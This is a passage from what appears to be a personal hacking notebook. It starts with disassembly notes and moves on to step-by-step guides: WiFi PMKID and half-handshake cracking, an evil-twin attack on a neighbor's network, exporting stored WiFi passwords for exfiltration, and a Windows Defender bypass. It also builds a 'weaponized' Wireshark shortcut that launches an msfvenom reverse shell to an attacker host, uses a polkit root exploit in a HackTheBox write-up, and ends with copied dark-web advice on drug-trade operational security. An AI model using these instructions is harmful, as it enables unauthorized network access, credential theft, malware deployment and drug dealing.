    10e4:       80 3d 45 2f 00 00 00    cmp    BYTE PTR [rip+0x2f45],0x0        # 4030 &lt;printf@plt+0x3000&gt;
    10eb:       75 33                   jne    1120 &lt;printf@plt+0xf0&gt;
    10ed:       55                      push   rbp
    10ee:       48 83 3d 02 2f 00 00    cmp    QWORD PTR [rip+0x2f02],0x0        # 3ff8 &lt;printf@plt+0x2fc8&gt;
    10f5:       00 
    10f6:       48 89 e5                mov    rbp,rsp
    10f9:       74 0d                   je     1108 &lt;printf@plt+0xd8&gt;
    10fb:       48 8b 3d 26 2f 00 00    mov    rdi,QWORD PTR [rip+0x2f26]        # 4028 &lt;printf@plt+0x2ff8&gt;
    1102:       ff 15 f0 2e 00 00       call   QWORD PTR [rip+0x2ef0]        # 3ff8 &lt;printf@plt+0x2fc8&gt;
    1108:       e8 63 ff ff ff          call   1070 &lt;printf@plt+0x40&gt;
    110d:       c6 05 1c 2f 00 00 01    mov    BYTE PTR [rip+0x2f1c],0x1        # 4030 &lt;printf@plt+0x3000&gt;
    1114:       5d                      pop    rbp
    1115:       c3                      ret    
    1116:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
    111d:       00 00 00 
    1120:       c3                      ret    
    1121:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
    1128:       00 00 00 00 
    112c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
    1130:       f3 0f 1e fa             endbr64 
    1134:       e9 67 ff ff ff          jmp    10a0 &lt;printf@plt+0x70&gt;
    1139:       55                      push   rbp
    113a:       48 89 e5                mov    rbp,rsp
    113d:       48 8d 05 c0 0e 00 00    lea    rax,[rip+0xec0]        # 2004 &lt;printf@plt+0xfd4&gt;
    1144:       48 89 c7                mov    rdi,rax
    1147:       b8 00 00 00 00          mov    eax,0x0
    114c:       e8 df fe ff ff          call   1030 &lt;printf@plt&gt;
    1151:       90                      nop
    1152:       5d                      pop    rbp
    1153:       c3                      ret    
    1154:       55                      push   rbp
    1155:       48 89 e5                mov    rbp,rsp
    1158:       48 83 ec 20             sub    rsp,0x20
    115c:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi
    115f:       48 89 75 f0             mov    QWORD PTR [rbp-0x10],rsi
    1163:       48 89 55 e8             mov    QWORD PTR [rbp-0x18],rdx
    1167:       b8 00 00 00 00          mov    eax,0x0
    116c:       e8 c8 ff ff ff          call   1139 &lt;printf@plt+0x109&gt;
    1171:       b8 00 00 00 00          mov    eax,0x0
    1176:       c9                      leave  
    1177:       c3                      ret    
    1178:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
    117f:       00 
    1180:       f3 0f 1e fa             endbr64 
    1184:       41 57                   push   r15
    1186:       4c 8d 3d 5b 2c 00 00    lea    r15,[rip+0x2c5b]        # 3de8 &lt;printf@plt+0x2db8&gt;
    118d:       41 56                   push   r14
    118f:       49 89 d6                mov    r14,rdx
    1192:       41 55                   push   r13
    1194:       49 89 f5                mov    r13,rsi
    1197:       41 54                   push   r12
    1199:       41 89 fc                mov    r12d,edi
    119c:       55                      push   rbp
    119d:       48 8d 2d 4c 2c 00 00    lea    rbp,[rip+0x2c4c]        # 3df0 &lt;printf@plt+0x2dc0&gt;
    11a4:       53                      push   rbx
    11a5:       4c 29 fd                sub    rbp,r15
    11a8:       48 83 ec 08             sub    rsp,0x8
    11ac:       e8 4f fe ff ff          call   1000 &lt;printf@plt-0x30&gt;
    11b1:       48 c1 fd 03             sar    rbp,0x3
    11b5:       74 1f                   je     11d6 &lt;printf@plt+0x1a6&gt;
    11b7:       31 db                   xor    ebx,ebx
    11b9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    11c0:       4c 89 f2                mov    rdx,r14
    11c3:       4c 89 ee                mov    rsi,r13
    11c6:       44 89 e7                mov    edi,r12d
    11c9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
    11cd:       48 83 c3 01             add    rbx,0x1
    11d1:       48 39 dd                cmp    rbp,rbx
    11d4:       75 ea                   jne    11c0 &lt;printf@plt+0x190&gt;
    11d6:       48 83 c4 08             add    rsp,0x8
    11da:       5b                      pop    rbx
    11db:       5d                      pop    rbp
    11dc:       41 5c                   pop    r12
    11de:       41 5d                   pop    r13
    11e0:       41 5e                   pop    r14
    11e2:       41 5f                   pop    r15
    11e4:       c3                      ret    
    11e5:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
    11ec:       00 00 00 00 
    11f0:       f3 0f 1e fa             endbr64 
    11f4:       c3                      ret    

Disassembly of section .fini:

00000000000011f8 &lt;.fini&gt;:
    11f8:       f3 0f 1e fa             endbr64 
    11fc:       48 83 ec 08             sub    rsp,0x8
    1200:       48 83 c4 08             add    rsp,0x8
    1204:       c3                      ret 
</code></pre>
<p>The main takeaway is that while the different sections are still clearly distinguishable, the functions are not. Instead all the functions have been merged into one big blob of code. Notice how stripped binaries can make your life much harder as a reverse engineer.</p>
<h2 id="loading-and-executing-a-binary"><a class="header" href="#loading-and-executing-a-binary">Loading and Executing a Binary</a></h2>
<p>Now you know how compilation works as well as how binaries look on the inside. You also learned how to statically disassemble binaries using objdump. Now it's time to learn what actually happens when you load and execute a binary.</p>
<p>Although the exact details vary depending on the platform and binary format, the process of loading and executing a binary typically involves a number of basic steps the following picture shows how a loaded ELF binary (like the one just compiled) is represented in memory on a Linux-based platform. At a high level, loading a PE binary on Windows is quite similar.</p>
<p><img src="https://i.imgur.com/4db89Jd.png" alt="" /></p>
<p>Loading a binary is a complicated process that involves a lot of work by the operating system. It's also important to note that a binary representation in memory does not necessarily correspond one-to-one with its on-disk representation. For instance, large regions of zero initialized data may be collapsed in the on-disk binary (to save disk space), while all those zeros will be expanded in memory. Some parts of the on-disk binary may be ordered differently in memory or not loaded into memory at all.</p>
<p>When you decide to run a binary the operating system starts by setting up a new process for the program to run in, including a virtual address space. Subsequently, the operating system maps an interpreter into the process virtual memory. This is a user space program that knows how to load the binary and perform the necessary relocations.  On Linux, the interpreter is typically a shared library called <em>ld-linux.so</em>. On Windows, the interpreter functionality is implemented as part of <em>ntdll.dll</em>. After loading the interpreter, the kernel transfers control to it, and the interpreter begins its work in user space.</p>
<p>Linux ELF binaries come with a special section called .interp that specifies the path to the interpreter that is to be used to load the binary.</p>
<pre><code>$ readelf -p .interp simple
String dump of section '.interp':
  [     0]  /lib64/ld-linux-x86-64.so.2

</code></pre>
<p>As mentionned, the interpreter loads the binary into its virtual address space (the same space in which the interpreter is loaded). It then parses the binary to find out (among other things) which dynamic libraries the binary uses. The interpreter maps these into the virtual address space (using mmap or an equivalent function) and then performs any necessary last-minute relocations in the binary's code sections to fill in the correct addresses for references to the dynamic libaries. In reality, the process of resolving references to functions in dynamic libraries is often deferred until later.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cracking-wifi-at-scale-with-hcxdumptool"><a class="header" href="#cracking-wifi-at-scale-with-hcxdumptool">Cracking Wifi at Scale with hcxdumptool</a></h1>
<p>Usually when a hacker wants to crack a WiFi password, he needs a full live four-way handshake between a client and the router, hoping the password entered by the client is the right one, this method of cracking wifi can be time consuming too since you need to wait for a client to actually attempts to connect to his router (usually we use deauthentication to accelerate the process).</p>
<p>All of this changed in 2018 when <a href="https://hashcat.net/forum/thread-7717.html">atom's</a> accidentally discovered a new way to crack WPA2 while searching for new ways to crack the new WPA3 security standard (GO READ HIS RESEARCH !).</p>
<p>Atom's technique is clientless, making the need to capture a user's login in real time and the need for users to connect to the network at all <strong>obsolete</strong>. Furthermore, it only required the attacker to capture a single frame and <strong>eliminate the wrong passwords and malformed frames that are disturbing the cracking process</strong>.</p>
<p>This means we do not need to wait for people connecting to their routers for this attack to be successful. We just need a PMKID hash and try to crack it.</p>
<p>To crack a PMKID hash generated and what elements does it contain</p>
<p><img src="https://i.imgur.com/NlZfEOP.png" alt="PMKID Hash" /></p>
<p>The hash calculation might seem daunting at first glance but let us dive into it.</p>
<p><img src="https://i.imgur.com/xx4Xlme.png" alt="" /></p>
<p><strong>The PMK is computed as follows:</strong></p>
<p><img src="https://i.imgur.com/zTGtXyD.png" alt="" /></p>
<p>After a PMK was generated we can generate a PMKID.</p>
<p><strong>The PMKID is computed as follows :</strong></p>
<p><img src="https://i.imgur.com/6oEJGPz.png" alt="" /></p>
<p><img src="https://i.imgur.com/ODQeVSz.png" alt="" /></p>
<h2 id="sniffing-pmkid"><a class="header" href="#sniffing-pmkid">Sniffing PMKID</a></h2>
<p>To gather PMKID hashes, we need a wireless network interface that has monitor mode capabilities. Monitor mode allows packet capturing without having to associate with an access point.</p>
<p>For this i'll use the <a href="https://www.alfa.com.tw/products/awus036ach?variant=36473965871176">AWUS036ACH from ALFA Network</a> which supports monitor mode and went inside the center of my city.</p>
<p>My machine is running arch linux (kernel 5.16.4-arch1-1), the instructions are pretty similar for debian based distributions.</p>
<h4 id="installing-drivers"><a class="header" href="#installing-drivers">Installing Drivers</a></h4>
<pre><code>git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au
cd rtl8812au
make &amp;&amp; sudo make install
</code></pre>
<h4 id="installing-hcxdumptool"><a class="header" href="#installing-hcxdumptool">Installing Hcxdumptool</a></h4>
<pre><code>sudo pacman -S hcxdumptool
</code></pre>
<h4 id="preparing-network"><a class="header" href="#preparing-network">Preparing Network</a></h4>
<p>For the sniffing to work properly we will need to stop services that might interfere with hcxdumptool.</p>
<pre><code>sudo systemctl stop wpa_supplicant
sudo systemctl stop NetworkManager
sudo airmon-ng check-kill
</code></pre>
<p><em>Note that it is not required to start monitor mode prior to hcxdumptool execution, since hcxdumptool will automatically make the use of syscalls and turn the interface in monitor mode by itself.</em></p>
<h4 id="starting-the-sniffing-with-hcxdumptool"><a class="header" href="#starting-the-sniffing-with-hcxdumptool">Starting the sniffing with hcxdumptool</a></h4>
<pre><code>sudo hcxdumptool -i wlan1 -o PMKID_CAP1.pcapng --disable_deauthentication --disable_client_attacks --enable_status=3
</code></pre>
<p><em>Now wear a hoody, because you will get a PMKID of every network you cross by that is vulnerable to the attack</em>.</p>
<p><img src="https://i.imgur.com/hM1pzNY.png" alt="" /></p>
<h2 id="cracking-time"><a class="header" href="#cracking-time">Cracking Time</a></h2>
<p>Now time for the last part of this sniffing attack, we will extract the hashes from our pcapng capture with the hcxpcapngtool.</p>
<pre><code>hcxpcapngtool -o Hashes.txt PMKID_CAP1.pcapng
</code></pre>
<p>This command will produce a hash file that each line takes on the following structure :</p>
<pre><code>SIGNATURE*TYPE*PMKID/MIC*MACAP*MACSTA*ESSID***
</code></pre>
<h4 id="install-hashcat"><a class="header" href="#install-hashcat">Install Hashcat</a></h4>
<p>Installing hashcat on arch can be easily done with the following command</p>
<pre><code>sudo pacman -S hashcat
</code></pre>
<h4 id="start-cracking-procedure"><a class="header" href="#start-cracking-procedure">Start Cracking Procedure</a></h4>
<p>You can generate a wordlists of all the phone network for a region identifier using crunch. If my region identifier is 450 then i would use the following command</p>
<pre><code>crunch 12 12 0123456789 -t 450@@@@@@@@@ -o phones.txt
</code></pre>
<p>The preceding command will generate a wordlist (phones.txt) with phone numbers starting from 4500000000 all the way up to 4509999999.</p>
<p>A lot of people are using their phone numbers as password, you can easily crack these networks with this simple trick :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="half-handshake-crack"><a class="header" href="#half-handshake-crack">Half-Handshake Crack</a></h1>
<p>Sometimes when waiting for handshakes you will catch only the half part of that handshake, that is without the handshake being acknowledged by the network in question.
Know that those handshakes can be extremely useful in certain scenarios.</p>
<p>When listening for handshakes in public places, you will often see half handshakes popped up in your capture file (or wireshark, or whatever you use). These handshakes are as much crackable as full three-way handshakes, thing is you can't know for sure if the password is right since half-handshake aren't acknowledge by the router.</p>
<p>You can capture Half Handshake pretty easily, first you need an adapter that his compatible with the aircrack-ng suite, here's a small list of chipset compatible with aicrack.</p>
<ul>
<li>Ralink RT8070, RT3070</li>
<li>Ralink RT2770, RT2750</li>
<li>Ralink RT3572, RT5572</li>
<li>Ralink RT5370N</li>
<li>Realtek RTL8812AU</li>
<li>Atheros AR9002U</li>
<li>Realtek RTL8188SU</li>
<li>Realtek RTL8192EU</li>
<li>Atheros AR9271</li>
</ul>
<p>Next thing to do is to install the right drivers for the adapter your going to use, i use Atheros AR9002U (TN-WN722N) and RTL8812AU (AWUS036ACH), so i installed the following drivers to get started.</p>
<pre><code>$ git clone https://github.com/aircrack-ng/rtl8188eus
$ git clone https://github.com/aircrack-ng/rtl8812au
</code></pre>
<p>Then you should be ready to go, enable monitor mode (don't forget to change your mac address <em>wink wink</em>), start airodump.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt;
</code></pre>
<p>Find a target network (make sure you have the right to crack it), and note the channel the network is currently using. Now let's start the real things, we are going to want to see what's going on in the airodump capture for this reason we'll manually capture the handshake with wireshark instead of using the airodump --write switch.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt; -c &lt;network channel&gt; &amp; wireshark
</code></pre>
<p>Open the wireshark window, and double click on the interface your currently listening on with airodump, now you can copy the BSSID of your target network and we'll use a filter inside wireshark so we will see only the packets addressed to this network.</p>
<pre><code>Wireshark BSSID Filter : wlan.ta == &lt;bssid&gt; || wlan.da == &lt;bssid&gt;
Handshake filter : eapol &amp;&amp; wlan.da == &lt;bssid&gt; || eapol &amp;&amp; wlan.ta == &lt;bssid&gt;
</code></pre>
<p>Now you can wait until someone tries to connect to the network with a password, you should capture EAPOL packets when the key reach <strong>Message 2 of 4</strong>, you know you have your half handshake.</p>
<h2 id="social-engineering-scenario"><a class="header" href="#social-engineering-scenario">Social Engineering Scenario</a></h2>
<p>Okay let's go a little deeper because half-handshakes can be used in a tons of different scenario, but in this section we'll explore one. </p>
<p>So here it is, you are currently in your home and you want to hack into your neighbor's wifi (totally unethical and illegal), but you can't seem to get any handshake out of their network, what you could do is make an Evil Access Point that looks exactly like your target network (same name, bssid) and put some random password on this network, you will also launch a ddos attack agains't the target network so that the victim can't connect to his real network. Now your neighbor get's home after a long day of work, he see's that he his disconnected from the network so he tries to connect to it, prompt is usual password and he see's that it doesn't work. </p>
<p>At this point you should have catched at least a handshake or even more that you can crack, it's time to stop the attack and allow your poor neighbor to connect back again to it's network.</p>
<p>Check on wireshark using the <strong>eapol</strong> filter or the Handshake filter i shown a little earlier, if you have eapol packets with &quot;Key (Message 2 of 4)&quot; this means you successfully captured your half-handshake. Save the capture to a .pcap file and we can go to the next step.</p>
<h2 id="time-to-crack"><a class="header" href="#time-to-crack">Time to crack</a></h2>
<p>Now you have successfully gotten your hands on your handshake it's time to crack it. For this, you can use either a predefined wordlist (works sometimes), or if you know the target you could build one based on your target, in this case i will show you using a predefined wordlist <strong>rockyou.txt</strong>, the command is the same as usual but i will still show it.</p>
<pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt &lt;capture file&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-tn-wn722n"><a class="header" href="#monitor-mode-on-tn-wn722n">Monitor Mode on TN-WN722N</a></h1>
<p>Installing the required packages and configure them to make TN-WN722N works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux"><a class="header" href="#arch-linux">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu

	# You can ignore compilation errors related to redhat
</code></pre>
<h2 id="debian-based-system"><a class="header" href="#debian-based-system">Debian based System</a></h2>
<pre><code class="language-bash">	sudo apt update
	sudo apt install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-awus036ach"><a class="header" href="#monitor-mode-on-awus036ach">Monitor Mode on AWUS036ACH</a></h1>
<p>Installing the required packages and configure them to make AWUS036ACH works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux-1"><a class="header" href="#arch-linux-1">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	 git clone https://github.com/aircrack-ng/rtl8812au.git
	cd rtl8812au
	make
	sudo make install
	reboot
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rpi-evil-ap-with-rtl88x2bu-wifi-card-driver"><a class="header" href="#rpi-evil-ap-with-rtl88x2bu-wifi-card-driver">RPI Evil AP with RTL88x2bu Wifi Card Driver</a></h1>
<p><em><strong>Fake / Evil AP's are great right !</strong></em></p>
<p>But sometime you want to make sure you have the most cheap pieces of equipment available so that if someone bust your device, you won't get mad losing it.</p>
<p>Hence this guide... RTL88x2bu is one of the cheapest wireless adapters available where i live, so i bought one a couple of years ago, but it was with disgust that i learn that this adapter didn't support monitor mode (this means i can't use it for attacks like deauth / dumping), and i also won't be able to see connections made on other networks.</p>
<p>Although the device can be used to make fake AP's, so this is what this guide will be about.</p>
<pre><code class="language-bash"># Update all packages per normal
sudo apt update
sudo apt upgrade

# Install prereqs
sudo apt install git dnsmasq hostapd bc build-essential dkms raspberrypi-kernel-headers

# Reboot just in case there were any kernel updates
sudo reboot

# Pull down the driver source
git clone https://github.com/cilynx/rtl88x2bu
cd rtl88x2bu/

# Configure for RasPi
sed -i 's/I386_PC = y/I386_PC = n/' Makefile
sed -i 's/ARM_RPI = n/ARM_RPI = y/' Makefile

# DKMS as above
VER=$(sed -n 's/\PACKAGE_VERSION=&quot;\(.*\)&quot;/\1/p' dkms.conf)
sudo rsync -rvhP ./ /usr/src/rtl88x2bu-${VER}
sudo dkms add -m rtl88x2bu -v ${VER}
sudo dkms build -m rtl88x2bu -v ${VER} # Takes ~3-minutes on a 3B+
sudo dkms install -m rtl88x2bu -v ${VER}

# Plug in your adapter then confirm your new interface name
ip addr

# Set a static IP for the new interface (adjust if you have a different interface name or preferred IP)
sudo tee -a /etc/dhcpcd.conf &lt;&lt;EOF
interface wlan1
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
EOF

# Clobber the default dnsmasq config
sudo tee /etc/dnsmasq.conf &lt;&lt;EOF
interface=wlan1
  dhcp-range=192.168.4.100,192.168.4.199,255.255.255.0,24h
EOF

# Configure hostapd
sudo tee /etc/hostapd/hostapd.conf &lt;&lt;EOF
interface=wlan1
driver=nl80211
ssid=pinet
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=CorrectHorseBatteryStaple
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

sudo sed -i 's|#DAEMON_CONF=&quot;&quot;|DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;|' /etc/default/hostapd

# Enable hostapd
sudo systemctl unmask hostapd
sudo systemctl enable hostapd

# Reboot to pick up the config changes
sudo reboot

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-cheatsheet"><a class="header" href="#windows-cheatsheet">Windows Cheatsheet</a></h1>
<p>Since i am more of the Linux type than Windows (for now), i will make this small cheatsheet where i will add, tips and tricks troughout time.</p>
<p>Note that those are a bit like personal notes but if you find something that should be changed or something that need to be added, feel free to reach out to me.</p>
<h2 id="export-wireless-profiles-with-passwords"><a class="header" href="#export-wireless-profiles-with-passwords">Export wireless profiles with passwords</a></h2>
<p>Exporting wireless profiles on Windows is something pretty simple to do, you can achieve this using the following command.</p>
<pre><code>$ netsh wlan export profile key=clear
</code></pre>
<p>This will export each network the computer recently connected to along with the passwords for these networks in a XML file.</p>
<p>You could write a script to export these files, either using a request, dns exfil, email, or anything that comes through your mind.</p>
<h2 id="bypassing-antivirus-with-dumpstacklog-trick"><a class="header" href="#bypassing-antivirus-with-dumpstacklog-trick">Bypassing Antivirus with DumpStack.log trick</a></h2>
<p>Windows Defender is a little weird sometimes, in fact you can bypass it just by naming your file DumpStack.log, this work since Windows does not scan files named DumpStack.log. This will probably be patched in the future but it can be useful on unpatched computes.</p>
<p><img src="https://i.imgur.com/RnAUQEn.png" alt="Mimikatz bypass Defender" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="wireshark-reverse-shell-on-windows"><a class="header" href="#wireshark-reverse-shell-on-windows">Wireshark Reverse Shell on Windows</a></h1>
<p>Thanks to <a href="https://twitter.com/netspooky">@netspooky</a> for <a href="https://vm.tiktok.com/TTPdrQc8p6/">showing this cool little trick</a> to pwn computers without even hacking them if you have physical access to them.</p>
<p>You can change the wireshark executable target for a LUA script that will execute another malicious executable on the system.</p>
<p>To achieve the reverse shell we are going to need the following 2 main things.</p>
<h2 id="the-malicious-executable"><a class="header" href="#the-malicious-executable">The malicious executable</a></h2>
<p>We first need a malicious executable that will be responsible for connecting to our C2 and giving this C2 full remote access.</p>
<p>For this you can either generate an executable with Cobalt Strike, Metasploit Framework or you can just make your own custom malware (stay in legal boundaries).</p>
<p>On this case we'll just use some simple Metasploit Framework generated payload since it's the quickest option, for this run the following command.</p>
<pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip of attacker&gt; LPORT=&lt;port of attacker&gt; -f exe -o burgers.exe
</code></pre>
<p>Then you can move the malicious executable named <code>burgers.exe</code> to your windows target, in our case i will move the <code>burgers.exe</code> in the <code>%TEMP%</code> directory on windows.</p>
<p><em>Note that if you did the same steps as me for the generation of the malicious executable, it will mostly be detected by the antivirus, this is because metasploit payloads are well known by most antivirus out here.</em></p>
<h2 id="the-lua-script"><a class="header" href="#the-lua-script">The LUA Script</a></h2>
<p>The second thing we need is that LUA Script which will be run everytime someone tries to open wireshark and will be responsible for running the malicious file we created in the previous section.</p>
<p>LUA is a pretty easy programming language, nothing tough here. Just write a small script that can execute another executable on the system.</p>
<p>This can be achieved easily using the following one liner script.</p>
<pre><code class="language-lua">-- You will have to change %userprofile% by your profile path
os.execute(&quot;START /B %userprofile%\\AppData\\Local\\Temp\\burgers.exe&quot;)
</code></pre>
<p>Put this in a file named <code>wireshark_startup.lua</code> and put it in the directory you want, in my case i will put it in the windows <code>%TEMP%</code> directory.</p>
<h2 id="wireshark-weaponization"><a class="header" href="#wireshark-weaponization">Wireshark Weaponization</a></h2>
<p>Now we have everything ready it's time to <em><strong>weaponize</strong></em> Wireshark. And this has never been simpler.</p>
<ol>
<li>Right click on the Wireshark Executable.</li>
<li>Find the <strong>Target</strong> input field, and change it for the following.</li>
</ol>
<pre><code>-X lua_script:%userprofile%\AppData\Local\Temp\burgers.exe
</code></pre>
<ol start="3">
<li>Apply the changes to the executable.</li>
</ol>
<p>Wireshark has successfully been weaponized, everytime it will get executed it will also execute our LUA script responsible for executing our malicious executable which will spawn us a shell at <code>&lt;ip of attacker&gt;:&lt;port of attacker&gt;</code>.</p>
<h2 id="catching-reverse-shells"><a class="header" href="#catching-reverse-shells">Catching Reverse Shells</a></h2>
<p>Now it's time for the fun bit, catching shells ! For this, start your listener at <code>&lt;ip of attacker&gt;:&lt;port of attacker&gt;</code>.</p>
<pre><code>$ ncat -lnvp 6969
</code></pre>
<p>If you are using msfconsole payload use the following method instead.</p>
<pre><code>$ msfconsole
&gt; use exploit/multi/handler
&gt; set payload windows/x64/shell_reverse_tcp
&gt; set LHOST &lt;ip of attacker&gt;
&gt; set LPORT &lt;port of attacker&gt;
&gt; exploit -j
</code></pre>
<p>And if you have physical access you can either execute wireshark yourself or wait for someone to execute it and catch shells outside their local area network.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="paper-hackthebox"><a class="header" href="#paper-hackthebox">Paper Hackthebox</a></h1>
<p>Paper is an easy machine from HackTheBox, you should be able to complete it on your own, however i will make a small writeup on how to complete this machine.</p>
<h2 id="user"><a class="header" href="#user">User</a></h2>
<p>First thing first, enumeration.</p>
<p>When sending a request to the ip address where the challenge is being hosted, it should send back a response header with an interesting field to use <code>X-Backend-Server</code>, this field is unusual and tells me that the website might be available on this domain, so i added <code>office.paper</code> to /etc/hosts.</p>
<p>Then going on this website we can quickly notice that it's a wordpress website and that it's outdated (5.2.3), little more digging reveals us that a user of name micheal left the password inside the wordpress drafts. Luckily for us, we can view these drafts without being authenticated with a small exploit for wordpress version 5.2.3.</p>
<p>PoC for the exploit :
<code>?static=1&amp;order=asc</code></p>
<p>So using the exploit i tried visiting <code>http://office.paper/?static=1&amp;order=asc</code> but i get a 404 page not found, so i decided to remove the <code>&amp;order=asc</code> part of the url and it worked.</p>
<p>Looking at the content of the draft, we don't see a password but a link to <code>chat.office.paper</code> where we can register, so i added <code>chat.office.paper</code> to /etc/hosts and registered on the website.</p>
<p>The website chat.office.paper is a rocketchat instance with a bot that has been made by a certain user, this bot can be used to list files in a directory and also read them. After a bit of digging, the file <code>../hubot/.env</code> contains credentials to the bot, trying the bot password with the ssh user dwight (you can read /etc/passwd with the bot to find out users) and the password we just found and we can read the user flag !</p>
<h2 id="root"><a class="header" href="#root">Root</a></h2>
<p>Root was also very easy to do, if you've been following the news, then you'd surely know that polkit has been target to a number of CVE's in the recent months (notably CVE-2021-4034 aKa Pwnkit and CVE-2021-3560).</p>
<p>In our case polkit is vulnerable to CVE-2021-3560, which as per <a href="https://access.redhat.com/security/cve/cve-2021-3560">redhat</a></p>
<ul>
<li>It was found that polkit could be tricked into bypassing the credential checks for D-Bus requests, elevating the privileges of the requestor to the root user.</li>
<li>This flaw could be used by an unprivileged local attacker to, for example, create a new local administrator. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.</li>
</ul>
<p>We won't go deep into the exploit as this is just a simple vulnerable machine, however feel free to dig more on polkit exploits by yourselves.</p>
<p>You can download this <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">script</a> on the victim machine.</p>
<p>Executing the script the following way, will try to exploit polkit and create a user of the name penis with sudo access.</p>
<pre><code>$ ./poc.sh -u=penis -p=penis
</code></pre>
<p>Then if the exploit succeeded, there should be a new user with sudo access named penis, let's change user and spawn a root shell.</p>
<pre><code>$ su penis
$ sudo passwd
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="social-media-anonymity-tips-and-tricks-from-dread"><a class="header" href="#social-media-anonymity-tips-and-tricks-from-dread">Social Media Anonymity Tips and Tricks (from dread)</a></h1>
<p>The guide is about anonymity on social media and the safe use of a mobile phones. It should make it difficult to identify what you do or who you are. There is something for everyone in it.</p>
<p>Thoughts on some applications.</p>
<p>Facebook Messenger: End to end encryption is opt in and only enabled when you start a secret conversation. Secret conversations not available on web app. FB has a history of all secret conversations, you can not delete it. Deleting something on FB doesn't delete anything from their databases or backups.</p>
<p>Telegram: Very popular and allows for huge groups. Desktop application does not have end to end encryption. End to End encryption is only in secret chats. If using a Televend shop to order drugs then you should use the app on Tails and manually PGP encrypt your address.
Set up Telegram on Tails dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/f21e4eada88a77f82008/#c-8f48c2c4c28c5ade43
Make Telegram persistent on Tails dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/6ba79b8708c26aaf2bd9/#c-ffc19b9f565eff160e
Telegram stores are throwing buyer OpSec out of the window. Telegram is what people think is safe and it is the de facto drug app in many countries. Use something else.</p>
<p>Wickr Me: Wickr does not have phone activation and it does not require an email to sign up. It is encrypted by default and it has a self destruct on messages that you can set up. A lot of vendors and other people in the drug trade trust Wickr. wickr.com/security/ Wickr does not hide who you are (IP address) or who you talk to. It is up to you to protect your identity. If the people you talk to fail to protect themselves then that can come back to bite you in the ass. You shouldn't on the same account talk to people you order drugs from, people you sell drugs to and then your real life friends too. All of this should be separate.</p>
<p>WhatsApp: Has end to end encryption. It is Facebook. Facebook wants to gather as much information as possible so they can better advertise to you. Probably not the best choice.</p>
<p>Instagram: Like facebook it is hostile towards Tor. Might be a lucrative place for advertising. It does not have end to end encryption for the chat.</p>
<p>Reddit and Twitter: Hostile towards Tor users. Reddit just doesn't work if you use a Tor exit node. They will shadowban you account. Twitter will lock your account if you use it with Tor and they'll ask for phone verification. These are still important platforms for getting a message out (DarkDotFail on Twitter, DreadAlert on Reddit).</p>
<p>SnapChat: Why do people post shit that incriminates them or you and expect SnapChat to actually delete what they post? SnapChat does not delete anything. It is a good place to advertise drugs.</p>
<p>TikTok, Tinder, Grindr: Might be a good places to advertise drugs, depends how you work them.</p>
<p>Signal: Signal is the most promising of all IM apps. Good security and privacy. Only thing kept in logs is your phone number. Phone number requirement is what is keeping me from recommending it to everyone. You can activate Signal with a temporary number and prevent account getting stolen signal.org/blog/signal-pins/ If you and who you are talking to are willing to go through with buying a phone number then use Signal.</p>
<p>Encrochat &amp; Sky ECC: LE found the servers and pushed an update that broke the encryption and identified the users. Users of the services were hiding among other criminals. The service was not any better than a free solution. It was a giant honeypot and the effects of it will be felt for years. Use something that is widely used by regular people. Information that is critical should be manually PGP encrypted.
All centralized services have useful data to hand over to LE. All of them can be forced to start logging data that they normally don't.</p>
<p>Data that is logged:</p>
<ol>
<li>Contacts and historical contacts on the app</li>
<li>Contacts on your phone</li>
<li>Contents of messages</li>
<li>Encrypted messages</li>
<li>Sent files</li>
<li>Deleted messages</li>
<li>Original EXIF data of sent photos</li>
<li>Phone models used with the app</li>
<li>Phone IMEI and other uniquely identifying data</li>
<li>IP addresses used with the</li>
<li>Your phone number</li>
